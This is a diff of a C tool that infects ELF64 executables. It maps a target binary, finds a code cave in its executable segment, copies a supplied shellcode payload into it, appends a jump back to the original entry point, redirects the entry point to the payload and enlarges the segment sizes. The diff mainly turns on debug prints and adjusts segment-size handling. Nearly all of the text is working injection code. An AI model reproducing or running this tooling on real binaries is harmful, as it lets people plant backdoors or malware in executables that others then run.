@@ -10,14 +10,14 @@
 char SUCCESS[]="0", OPEN_ERROR[]="1", NOT_SUFFICIENT_CAVE_FOUND[]="2", MMAP_ERROR[]="3", OTHER_ERROR[]="4";
 
 int main (int argc, char *argv[]) {
-//    printf("start\n");
+    printf("start\n");
 
 	if (argc != 3) {
 		fprintf(stderr, "[!] Usage: %s <target> <payload>\n", argv[0]);
 		exit(1);
 	}
 
-//    printf("open and map target file\n");
+    printf("open and map target file\n");
 	int 		t_fd, t_size;
 	struct 		stat _info; 
 	void		*t_addr;
@@ -40,8 +40,8 @@ int main (int argc, char *argv[]) {
 		exit(1);
 	}
 
-//    printf("get target file info\n");
-//    printf("t_addr = %x\n", t_addr);
+    printf("get target file info\n");
+    printf("t_addr = %x\n", t_addr);
 	Elf64_Ehdr	*t_ehdr;
 
 	// get ELF header
@@ -79,19 +79,27 @@ int main (int argc, char *argv[]) {
 
 //	find executable load segment
 
-//    printf("find executable load segment\n");
+    printf("find executable load segment\n");
 	int		seg_size = 0;
 	Elf64_Phdr 	*t_phdr;
     int num = t_ehdr->e_phnum;
-//    printf("t_ehdr->e_phnum = %x\n", num);
+    printf("t_ehdr->e_phnum = %x\n", num);
 
 
     // get first program header
 	t_phdr = (Elf64_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);
-//    printf("t_phdr = %d\n", t_phdr);
+    printf("t_phdr = %x\n", t_phdr);
 
 	// find executable load segment
-	for (i = 0; i < t_ehdr->e_phnum; i++) {
+//    for (i = 0; i < t_ehdr->e_phnum; i++) {
+//        if (t_phdr->p_type == PT_LOAD) {
+//            t_phdr->p_flags |= 0x11;
+//        }
+//        t_phdr = (Elf64_Phdr *) ((unsigned char*) t_phdr + (unsigned int) t_ehdr->e_phentsize);
+//    }
+//
+//    t_phdr = (Elf64_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);
+    for (i = 0; i < t_ehdr->e_phnum; i++) {
 		if (t_phdr->p_type == PT_LOAD && t_phdr->p_flags & 0x11) {
 			break;
 		}
@@ -100,17 +108,17 @@ int main (int argc, char *argv[]) {
 
 	// get segment size
 
-//    printf("seg_size = %x\n", seg_size);
-//    printf("t_phdr->p_filesz = %x\n", t_phdr->p_filesz);
-//    printf("t_phdr->p_align = %x\n", t_phdr->p_align);
+    printf("seg_size = %x\n", seg_size);
+    printf("t_phdr->p_filesz = %x\n", t_phdr->p_filesz);
+    printf("t_phdr->p_align = %x\n", t_phdr->p_align);
 
     while (seg_size < t_phdr->p_filesz) {
-//        printf("seg_size = %d\n", seg_size);
+        printf("seg_size = %d\n", seg_size);
         seg_size += t_phdr->p_align;
 	}
 
 //	find code cave
-//    printf("find code cave\n");
+    printf("find code cave\n");
 	int		cc_offset, count = 0;
 	void 		*t_seg_ptr = t_addr + t_phdr->p_offset;
 
@@ -131,18 +139,18 @@ int main (int argc, char *argv[]) {
 	}
 
 	if (count == 0) {
-//		fprintf(stderr, "[!] codecave: no sufficiently large codecave found\n");
+		fprintf(stderr, "[!] codecave: no sufficiently large codecave found\n");
         printf(NOT_SUFFICIENT_CAVE_FOUND);
         exit(1);
 	}
 
 //	inject shellcode into code cave
-//    printf("inject shellcode into code cave\n");
+    printf("inject shellcode into code cave\n");
 	// get address of payload
     void *sc_addr = p_addr;
 	// copy payload to code cave
-//    printf("cc_offset = %d\n", cc_offset);
-//    printf("t_ehdr->e_entry = %d\n", t_ehdr->e_entry);
+    printf("cc_offset = %d\n", cc_offset);
+    printf("t_ehdr->e_entry = %d\n", t_ehdr->e_entry);
 
     Elf64_Addr cur_pos = t_addr + cc_offset;
 	memmove(cur_pos, sc_addr, sc_size);
@@ -177,11 +185,11 @@ int main (int argc, char *argv[]) {
     }
     char NOP = 0x90;
     memmove(cur_pos, &NOP, 1);
-//    printf("bytes_to_oep = %d\n", bytes_to_oep);
+    printf("bytes_to_oep = %d\n", bytes_to_oep);
 
 
 //	set entry point to payload
-//    printf("set entry point to payload\n");
+    printf("set entry point to payload\n");
 	Elf64_Addr	*base;
 	Elf64_Phdr 	*t_phdr2 = (Elf64_Phdr *) ((unsigned char *) t_ehdr + (unsigned int) t_ehdr->e_phoff);
 
@@ -192,15 +200,16 @@ int main (int argc, char *argv[]) {
 		}
 		t_phdr2 = (Elf64_Phdr *) ((unsigned char *) t_phdr2 + (unsigned int) t_ehdr->e_phentsize);
 	}
-//    printf("base = %d\n", base);
+    printf("base = %d\n", base);
 
     // replace entry point with address of payload
 	t_ehdr->e_entry = (unsigned int) base + cc_offset;
 
 
 //	augment executable segment
-//    printf("augment executable segment\n");
+    printf("augment executable segment\n");
 	t_phdr->p_memsz += sc_size + 7;
+    t_phdr->p_filesz += sc_size + 7;
 
 //	augment relevent section
 
